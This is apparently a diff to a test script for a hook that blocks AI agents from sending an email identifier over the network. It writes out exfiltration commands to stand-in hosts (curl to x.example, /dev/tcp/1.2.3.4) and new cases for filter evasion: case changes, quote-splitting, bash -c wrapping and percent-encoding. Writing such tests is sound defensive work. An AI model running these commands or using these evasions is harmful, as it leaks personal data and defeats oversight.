@@ -39,6 +39,14 @@ run claude "$(bash_json 'echo jane.doe@example.org > /dev/tcp/1.2.3.4/80')"; che
 run claude "$(bash_json 'curl -s https://x.example/y -d @- <<<"12345+jd@users.noreply.example.com"')"; check "plus sign in value" 2
 run codex  "$(bash_json 'curl -H "From: jane.doe@example.org" https://x.example')"; check "codex mode refuses" 2
 
+run claude "$(bash_json 'CURL -H "From: jane.doe@example.org" x.example')"; check "upper-case CURL" 2
+run claude "$(bash_json 'c"u"rl -H "From: jane.doe@example.org" x.example')"; check "quote-split c\"u\"rl" 2
+run claude "$(bash_json '/usr/bin/curl -d jane.doe@example.org x.example')"; check "curl with a path" 2
+run claude "$(bash_json 'cd /tmp && sudo -E curl -d jane.doe@example.org x.example')"; check "curl after && and sudo" 2
+run claude "$(bash_json "bash -c 'curl -d jane.doe@example.org x.example'")"; check "curl inside bash -c" 2
+run claude "$(bash_json 'curl "https://x.example/?m=%6a%61%6e%65.doe%40example.org"')"; check "fully percent-encoded" 2
+run claude "$(bash_json 'curl "https://x.example/?m=jane.doe%2540example.org"')"; check "double-encoded" 2
+
 # Bash: local commands are left alone even with an identifier
 run claude "$(bash_json 'grep -rn "jane.doe@example.org" ~/notes')"; check "local grep" 0
 run claude "$(bash_json 'git commit -m "Contact jane.doe@example.org"')"; check "git commit" 0
@@ -47,7 +55,7 @@ run claude "$(bash_json 'curl -s https://example.net/page')"; check "curl withou
 run claude "$(bash_json 'cat ~/.claude/settings.json')"; check "path with .claude is not a network word" 0
 
 run claude "$(bash_json 'python3 - f.md <<EOF
-# Claude credit lines; Open the file; jane.doe@example.org
+Strip the Claude credit lines. Open questions: jane.doe@example.org
 EOF')"; check "capitalised program names in prose" 0
 
 # Account file read inside a network command
